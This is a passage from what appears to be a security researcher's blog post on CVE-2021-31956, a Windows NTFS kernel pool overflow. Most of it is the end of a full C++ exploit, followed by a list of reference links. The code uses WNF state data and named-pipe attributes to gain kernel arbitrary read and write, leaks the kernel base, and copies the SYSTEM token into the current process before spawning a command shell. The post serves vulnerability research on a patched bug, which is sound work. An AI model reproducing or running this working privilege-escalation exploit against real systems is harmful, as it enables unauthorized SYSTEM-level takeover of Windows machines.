UINT64 pDeviceObject = <span class="built_in">arbRead64</span>(pFileObject + DEVICE_OBJECT_OFFSET, state, pQueryBuffer, pipeHandles);</span><br><span class="line">    UINT64 pDriverObject = <span class="built_in">arbRead64</span>(pDeviceObject + DRIVER_OBJECT_OFFSET, state, pQueryBuffer, pipeHandles);</span><br><span class="line">    UINT64 pIopInvalidDeviceRequest = <span class="built_in">arbRead64</span>(pDriverObject + MAJOR_FUNCTION_OFFSET + IOP_INVALID_DEVICE_REQUEST_OFFSET, state, pQueryBuffer, pipeHandles);</span><br><span class="line">    UINT64 kernelBase = pIopInvalidDeviceRequest - IOP_INVALID_DEVICE_REQUEST_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] pFileObject : &quot;</span> &lt;&lt; std::hex &lt;&lt; pFileObject &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] pDeviceObject : &quot;</span> &lt;&lt; std::hex &lt;&lt; pDeviceObject &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] pDriverObject : &quot;</span> &lt;&lt; std::hex &lt;&lt; pDriverObject &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] pIopInvalidDeviceRequest : &quot;</span> &lt;&lt; std::hex &lt;&lt; pIopInvalidDeviceRequest &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] kernelBase : &quot;</span> &lt;&lt; std::hex &lt;&lt; kernelBase &lt;&lt; std::endl;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kernelBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">changeToken</span><span class="params">(UINT64 eprocess, PWNF_STATE_NAME pOverflowWNFState, PVOID pQueryBuffer, ULONG queryBufferSize, PipeHandles pipeHandles, PWNF_STATE_NAME pWriteStateName)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] changeToken&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    UINT64 beginEprocess = eprocess;</span><br><span class="line">    UINT64 processId = <span class="number">0</span>;</span><br><span class="line">    UINT64 nextEprocess = <span class="number">0</span>;</span><br><span class="line">    UINT64 dwPID = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">    UINT64 currentEprocess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        processId = <span class="built_in">arbRead64</span>(eprocess + PROCESS_ID_OFFSET, pOverflowWNFState, pQueryBuffer, pipeHandles);</span><br><span class="line">        <span class="keyword">if</span> (processId == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        nextEprocess = <span class="built_in">arbRead64</span>(eprocess + NEXT_EPROCESS_OFFSET, pOverflowWNFState, pQueryBuffer, pipeHandles) - NEXT_EPROCESS_OFFSET;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nextEprocess == beginEprocess) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (processId == dwPID) &#123;</span><br><span class="line">            currentEprocess = eprocess;</span><br><span class="line">        &#125;</span><br><span class="line">        eprocess = nextEprocess;</span><br><span class="line">    &#125;</span><br><span class="line">    UINT64 systemToken = <span class="built_in">arbRead64</span>(eprocess + TOKEN_OFFSET, pOverflowWNFState, pQueryBuffer, pipeHandles);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] systemToken : &quot;</span> &lt;&lt; std::hex &lt;&lt; systemToken &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] eprocess : &quot;</span> &lt;&lt; std::hex &lt;&lt; eprocess &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    ULONG fakeTokenSize = (TOKEN_OFFSET + <span class="number">8</span>) - CREATE_TIME_OFFSET;</span><br><span class="line"></span><br><span class="line">    UINT64 writeAddr = currentEprocess + CREATE_TIME_OFFSET;</span><br><span class="line">    UINT64 originNameStatePtr = ((PUINT64)pQueryBuffer)[(ALLOC_SIZE + TOTAL_WNF_SIZE + <span class="number">0x68</span>) / <span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line">    PCHAR pFakeToken = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, fakeTokenSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pFakeToken == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to VirtualAlloc pFakeToken&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(pFakeToken, <span class="number">0</span>, fakeTokenSize);</span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; fakeTokenSize / <span class="number">0x8</span>; i++) &#123;</span><br><span class="line">        UINT64 tmpValue = <span class="built_in">arbRead64</span>(writeAddr + i * <span class="number">0x8</span>, pOverflowWNFState, pQueryBuffer, pipeHandles);</span><br><span class="line">        <span class="built_in">memcpy</span>(pFakeToken + i * <span class="number">0x8</span>, &amp;tmpValue, <span class="built_in">sizeof</span>(tmpValue));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(pFakeToken + TOKEN_OFFSET - CREATE_TIME_OFFSET, &amp;systemToken, <span class="built_in">sizeof</span>(systemToken));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">arbWrite</span>(writeAddr, pFakeToken, fakeTokenSize, pOverflowWNFState, pQueryBuffer, pWriteStateName);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualFree</span>(pFakeToken, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">spawn_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));</span><br><span class="line"></span><br><span class="line">    STARTUPINFOA si;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] shell!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        CREATE_NEW_CONSOLE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE fileHandle = <span class="built_in">getFileHandle</span>();</span><br><span class="line">    </span><br><span class="line">    USHORT eaBlockSize = <span class="number">8</span> + EA_NAME_LEN1 + ALLOC_SIZE;</span><br><span class="line">    USHORT eaPaddingLen = ((eaBlockSize + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - eaBlockSize;</span><br><span class="line">    <span class="keyword">if</span> (!eaPaddingLen) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] can&#x27;t trigger the bug with eaPaddingLen be zero!&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WNF_STATE_DATA fakeWNFStateData = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    fakeWNFStateData.Header = <span class="number">0x00100904</span>;</span><br><span class="line">    fakeWNFStateData.AllocatedSize = FAKE_WNF_SIZE;</span><br><span class="line">    fakeWNFStateData.DataSize = FAKE_WNF_SIZE;</span><br><span class="line">    fakeWNFStateData.ChangeStamp = <span class="number">0x2</span>;</span><br><span class="line"></span><br><span class="line">    USHORT totalSize = <span class="built_in">sizeof</span>(fakeWNFStateData) + eaPaddingLen;</span><br><span class="line"></span><br><span class="line">    PCHAR pEaValue = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, totalSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pEaValue == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to pEaValue pBuffer&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pEaValue, <span class="number">0</span>, totalSize);</span><br><span class="line">    <span class="built_in">memset</span>(pEaValue, <span class="number">0x62</span>, eaPaddingLen);</span><br><span class="line">    <span class="built_in">memcpy</span>(pEaValue + eaPaddingLen, &amp;fakeWNFStateData, <span class="built_in">sizeof</span>(fakeWNFStateData));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setEaFile</span>(fileHandle, pEaValue, totalSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualFree</span>(pEaValue, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    PWNF_STATE_NAME states = <span class="built_in">sprayWNF</span>(SPRAY_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">deleteWnfStateData</span>(&amp;states[SPRAY_SIZE - <span class="number">0x30</span>]);</span><br><span class="line">    <span class="built_in">queryEaFile</span>(fileHandle);</span><br><span class="line">    </span><br><span class="line">    ULONG overflowWNFIdx = <span class="built_in">lookForOverflowWNF</span>(states);</span><br><span class="line">    WNF_STATE_NAME overflowWNFState = states[overflowWNFIdx];</span><br><span class="line"></span><br><span class="line">    PipeHandles pipeHandles = <span class="built_in">createPipe</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_WRITE_ROUNDS; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == PIPE_WRITE_ROUNDS / <span class="number">2</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">deleteWnfStateData</span>(&amp;states[overflowWNFIdx - PIPE_WRITE_ROUNDS / <span class="number">2</span> + i]);</span><br><span class="line">        <span class="type">char</span> name[PIPE_NAME_LEN] = &#123;</span><br><span class="line">            <span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,</span><br><span class="line">            <span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,</span><br><span class="line">            i + <span class="number">1</span></span><br><span class="line">        &#125;;</span><br><span class="line">        ULONG valueLen = PIPE_ATTRIBUTE_BUFFER_SIZE - <span class="built_in">sizeof</span>(name) - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        PCHAR pValue = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, valueLen, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (pValue == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;[-] failed to VirtualAlloc pValue&quot;</span>;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(pValue, <span class="number">0x61</span>, valueLen);</span><br><span class="line">        <span class="built_in">pipeWriteAttribute</span>(pipeHandles, name, pValue);</span><br><span class="line">        <span class="built_in">VirtualFree</span>(pValue, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    WNF_CHANGE_STAMP wmfChangeStamp = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> queryBuffer[FAKE_WNF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ULONG queryBufferSize = <span class="built_in">sizeof</span>(queryBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queryWnfStateData</span>(&amp;overflowWNFState, &amp;wmfChangeStamp, queryBuffer, &amp;queryBufferSize);</span><br><span class="line">    PUINT64 pQueryBuffer = (PUINT64)queryBuffer;</span><br><span class="line">    </span><br><span class="line">    UINT64 fd = pQueryBuffer[(ALLOC_SIZE + <span class="number">0x10</span>) / <span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line">    UINT64 kernelBase = <span class="built_in">leakKernelAddr</span>(fd, &amp;overflowWNFState, queryBuffer, pipeHandles);</span><br><span class="line"></span><br><span class="line">    UINT64 pNextName = pQueryBuffer[(ALLOC_SIZE + TOTAL_WNF_SIZE + <span class="number">0x20</span>) / <span class="number">0x8</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">checkIsKernelAddr</span>(pNextName)) &#123;</span><br><span class="line">        UINT64 nextName = <span class="built_in">arbRead64</span>(pNextName, &amp;overflowWNFState, queryBuffer, pipeHandles);</span><br><span class="line">        <span class="keyword">if</span> (nextName == <span class="number">0x6968676669686766</span>) &#123;</span><br><span class="line">            UINT8 nextNameIdx = (<span class="built_in">arbRead64</span>(pNextName + <span class="number">8</span>, &amp;overflowWNFState, queryBuffer, pipeHandles)) &amp; <span class="number">0xff</span>;</span><br><span class="line">            <span class="type">char</span> name[PIPE_NAME_LEN] = &#123;</span><br><span class="line">               <span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,</span><br><span class="line">               <span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,</span><br><span class="line">               nextNameIdx</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">pipeDeleteAttribute</span>(pipeHandles, name);</span><br><span class="line"></span><br><span class="line">            PWNF_STATE_NAME writeStateName = <span class="built_in">sprayWNF</span>(<span class="number">1</span>, <span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memset</span>(queryBuffer, <span class="number">0</span>, queryBufferSize);</span><br><span class="line">            <span class="built_in">queryWnfStateData</span>(&amp;overflowWNFState, &amp;wmfChangeStamp, queryBuffer, &amp;queryBufferSize);</span><br><span class="line"></span><br><span class="line">            UINT64 pStateData = pQueryBuffer[(ALLOC_SIZE + TOTAL_WNF_SIZE + <span class="number">0x68</span>) / <span class="number">0x8</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">checkIsKernelAddr</span>(pStateData)) &#123;</span><br><span class="line">                UINT64 stateData = <span class="built_in">arbRead64</span>(pStateData + <span class="number">0x10</span>, &amp;overflowWNFState, queryBuffer, pipeHandles);</span><br><span class="line">                <span class="keyword">if</span> (stateData == <span class="number">0x6060606060606060</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    UINT64 eprocess = pQueryBuffer[(ALLOC_SIZE + TOTAL_WNF_SIZE + <span class="number">0xa8</span>) / <span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">changeToken</span>(eprocess, &amp;overflowWNFState, &amp;queryBuffer, queryBufferSize, pipeHandles, writeStateName);</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">spawn_shell</span>();</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    std::cerr &lt;&lt; <span class="string">&quot;[-] stateData doesn&#x27;t match!&quot;</span>;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                std::cerr &lt;&lt; <span class="string">&quot;[-] pStateData is not a kernel address!&quot;</span>;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">VirtualFree</span>(writeStateName, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] pNextName is not a kernel address!&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">VirtualFree</span>(states, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) – Part 1 – NCC Group Research</a></p>
<p><a target="_blank" rel="noopener" href="https://research.nccgroup.com/2021/08/17/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/">CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) – Part 2 – NCC Group Research</a></p>
<p><a target="_blank" rel="noopener" href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">PuzzleMaker attacks with Chrome zero-day exploit chain | Securelist</a></p>
<p><a target="_blank" rel="noopener" href="https://dawnslab.jd.com/CVE-2021-31956/">CVE-2021-31956漏洞分析 | 京东探索研究院信息安全实验室 (jd.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1&#x2F;SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-zwqueryeafile">ZwQueryEaFile function (ntifs.h) - Windows drivers | Microsoft Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://marc.info/?l=wine-patches&m=125969675514121&w=2">‘[2&#x2F;4]ntdll&#x2F;tests: test NtSetEaFile’ - MARC</a></p>
<p><a target="_blank" rel="noopener" href="https://docplayer.net/220781597-Pwning-the-windows-10-kernel-with-ntfs-and-wnf-poc-2021.html">Pwning the Windows 10 Kernel with NTFS and WNF - POC PDF Free Download (docplayer.net)</a></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/56056589/is-it-good-to-use-ntdll-dll-in-a-win32-console-application">c++ - Is it good to use ntdll.dll in a win32 console application? - Stack Overflow</a></p>
<p><a target="_blank" rel="noopener" href="https://reverseengineering.stackexchange.com/questions/17310/appropriate-function-to-set-ntfs-extended-attributes-zwseteafile-or-ntseteafile">disassembly - Appropriate function to set NTFS extended attributes: ZwSetEaFile or NtSetEaFile - Reverse Engineering Stack Exchange</a></p>
<p><a target="_blank" rel="noopener" href="https://vul.360.net/archives/83">Windows Pool OverFlow漏洞利用 (360.net)</a></p>
<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://docplayer.net/145030841-The-windows-notification-facility.html">The Windows Notification Facility - PDF Free Download (docplayer.net)</a></p>
<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/external/github.com/DynamoRIO/drmemory/+/refs/heads/master/wininc/ntexapi.h">wininc&#x2F;ntexapi.h - external&#x2F;github.com&#x2F;DynamoRIO&#x2F;drmemory - Git at Google (googlesource.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264623">Windows内核池风水利用工具研究 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://research.nccgroup.com/2020/05/25/cve-2018-8611-exploiting-windows-ktm-part-5-5-vulnerability-detection-and-a-better-read-write-primitive/">CVE-2018-8611 Exploiting Windows KTM Part 5&#x2F;5 – Vulnerability detection and a better read&#x2F;write primitive – NCC Group Research</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Vergissmeinnicht</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://ret2ver.github.io/2021/12/27/CVE-2021-31956-%EF%BC%9ANTFS-%E6%A8%A1%E5%9D%97%E7%9A%84%E6%B1%A0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">https://ret2ver.github.io/2021/12/27/CVE-2021-31956-%EF%BC%9ANTFS-%E6%A8%A1%E5%9D%97%E7%9A%84%E6%B1%A0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/11/CVE-2021-1732-%EF%BC%9Awin32k-%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%AF%B9%E5%81%8F%E7%A7%BB%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CVE-2021-1732 ：win32k 中的相对偏移读写漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/23/CVE-2021-24086-%EF%BC%9ATCPIP-%E4%B8%AD%E7%9A%84%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CVE-2021-24086 ：TCPIP 中的空指针解引用漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/04/29/RkrKDQiodbYj2eu.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Vergissmeinnicht</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">32</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ret2ver"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ret2ver" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:verhan@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Live Long And Pwn.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8EWNF%E5%88%B0%E4%B8%80%E5%AE%9A%E8%8C%83%E5%9B%B4%E5%86%85%E7%9A%84%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99"><span class="toc-number">2.1.</span> <span class="toc-text">从WNF到一定范围内的任意读写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">2.2.</span> <span class="toc-text">任意地址读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9C%B0%E5%9D%80"><span class="toc-number">2.3.</span> <span class="toc-text">泄露内核地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%88%B6%E7%9A%84%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%92%8C%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">有限制的任意地址写和提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Patch%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">Patch分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E5%86%85%E5%AE%B9"><span class="toc-number">4.</span> <span class="toc-text">补充内容</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-number">4.1.</span> <span class="toc-text">泄露地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E5%86%85%E6%A0%B8%E5%A0%86"><span class="toc-number">4.2.</span> <span class="toc-text">恢复内核堆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%B3%E5%AE%9A%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99"><span class="toc-number">4.3.</span> <span class="toc-text">稳定任意读写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-fuzz/" title="AFL源码阅读 - afl-fuzz">AFL源码阅读 - afl-fuzz</a><time datetime="2022-03-14T09:35:50.000Z" title="Created 2022-03-14 17:35:50">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-clang-fast/" title="AFL源码阅读 - afl-clang-fast">AFL源码阅读 - afl-clang-fast</a><time datetime="2022-03-14T06:47:50.000Z" title="Created 2022-03-14 14:47:50">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/13/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-afl-as/" title="AFL源码阅读 - afl-as">AFL源码阅读 - afl-as</a><time 